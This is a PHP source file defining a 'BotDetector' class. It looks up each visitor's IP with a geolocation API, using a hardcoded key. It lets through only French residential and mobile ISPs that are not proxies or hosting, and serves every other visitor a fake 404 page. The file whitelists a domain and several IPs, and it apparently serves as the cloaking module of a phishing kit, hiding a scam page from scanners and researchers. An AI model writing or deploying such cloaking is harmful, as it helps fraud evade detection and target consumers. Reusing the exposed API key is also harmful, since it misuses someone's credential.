<?php

namespace App\Security;

use Psr\Log\LoggerInterface;

class BotDetector
{
    private $apiKey;
    private $logger;
    private $allowedIspList;

     // Modifiez la signature du constructeur pour qu'elle n'accepte que le logger
    public function __construct(?LoggerInterface $logger = null)
    {
        $this->apiKey = "5NCYMEzaCcMCEJs";
        $this->logger = $logger;
        
        $this->allowedIspList = [
            'free', 'bouygues', 'sfr', 'orange', 'red by sfr', 'sosh',
            'la poste mobile', 'coriolis', 'numericable', 'nrj mobile',
            'videofutur', 'zeop', 'canalbox', 'k-net', 'kiwi fibre',
            'weaccess', 'wibox', 'nordnet', 'ozone'
        ];

        // Vérification que la clé API est configurée
        if (empty($this->apiKey)) {
            if ($this->logger) {
                $this->logger->error("IP API key is not configured");
            }
            throw new \Exception("IP API key is not configured");
        }
    }

    public function detectBot(string $ipAddress): bool
    {
        // Vérification des IPs locales
        if ($ipAddress === '::1' || $ipAddress === '127.0.0.1' || $ipAddress === "127.0.0.1:3000" || $ipAddress === "localhost:3000" || $ipAddress === "10.222.26.50" || $ipAddress === "154.127.36.211" || $ipAddress === "223.29.226.66" || $ipAddress === "10.222.27.7" || $ipAddress === "https://relaiscenter.online/") {
            $this->logger && $this->logger->info("Local IP detected, not a bot: {$ipAddress}");
            return false;
        }

        try {
            // Appel à l'API ip-api.com
            $url = "https://pro.ip-api.com/json/{$ipAddress}?key={$this->apiKey}";
            $response = file_get_contents($url);
            
            if ($response === false) {
                throw new \Exception("Failed to fetch IP data from API");
            }

            $data = json_decode($response, true);
            
            if (!$data || $data['status'] !== 'success') {
                $this->logger && $this->logger->warning("IP API returned unsuccessful status for IP: {$ipAddress}");
                return true; // En cas d'échec, on considère comme bot par sécurité
            }

            // Stockage des informations IP
            $ipInfo = [
                "city" => $data['city'] ?? '',
                "zip" => $data['zip'] ?? '',
                "as" => $data['as'] ?? '',
                "mobile" => $data['mobile'] ?? false,
                "proxy" => $data['proxy'] ?? false,
                "hosting" => $data['hosting'] ?? false,
            ];

            $this->logger && $this->logger->info("IP data retrieved", ['ip' => $ipAddress, 'data' => $ipInfo]);

            // Vérification si le FAI est dans la liste autorisée
            $as = strtolower($ipInfo['as']);
            $isAllowedIsp = false;
            
            foreach ($this->allowedIspList as $isp) {
                if (strpos($as, $isp) !== false) {
                    $isAllowedIsp = true;
                    break;
                }
            }

            // Détermination si c'est un bot
            $isBot = true;
            
            if ($isAllowedIsp) {
                if (!$ipInfo['proxy'] && !$ipInfo['hosting']) {
                    $isBot = false;
                }
            }

            $this->logger && $this->logger->info("Bot detection result", ['ip' => $ipAddress, 'is_bot' => $isBot]);
            return $isBot;

        } catch (\Exception $e) {
            $this->logger && $this->logger->error("Bot detection error: " . $e->getMessage());
            return true; // En cas d'erreur, on considère comme bot par sécurité
        }
    }

    public function getBlockedPage(): string
    {
        return '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>404 Not Found</title>
            <style>
                body {
                    font-family: \'Roboto\', Arial, sans-serif;
                    background: linear-gradient(135deg, #ece9e6, #ffffff);
                    color: #333;
                    margin: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    text-align: center;
                }
                .container {
                    max-width: 600px;
                    padding: 20px;
                    border-radius: 15px;
                    animation: fadeIn 1s ease-in-out;
                }
                h1 {
                    font-size: 96px;
                    color: #e74c3c;
                    margin: 0;
                }
                p {
                    font-size: 18px;
                    margin: 15px 0;
                    color: #555;
                }
                a {
                    display: inline-block;
                    text-decoration: none;
                    color: #fff;
                    background-color: #3498db;
                    font-size: 18px;
                    padding: 12px 25px;
                    border-radius: 5px;
                    margin-top: 20px;
                    transition: all 0.3s ease;
                }
                a:hover {
                    background-color: #1d78c1;
                    box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.1);
                    transform: translateY(-3px);
                }
                .icon {
                    font-size: 100px;
                    color: #e74c3c;
                    margin-bottom: 20px;
                }
                @media (max-width: 768px) {
                    h1 {
                        font-size: 72px;
                    }
                    p {
                        font-size: 16px;
                    }
                    .icon {
                        font-size: 80px;
                    }
                }
                @media (max-width: 480px) {
                    h1 {
                        font-size: 48px;
                    }
                    p {
                        font-size: 14px;
                    }
                    .icon {
                        font-size: 60px;
                    }
                    .container {
                        padding: 15px;
                    }
                }
                @keyframes fadeIn {
                    from {
                        opacity: 0;
                        transform: translateY(50px);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="icon">🚫</div>
                <h1>404</h1>
                <p>Sorry, the page you are looking for does not exist or has been moved.</p>
                <a href="https://google.com">Go Back Home</a>
            </div>
        </body>
        </html>';
    }
}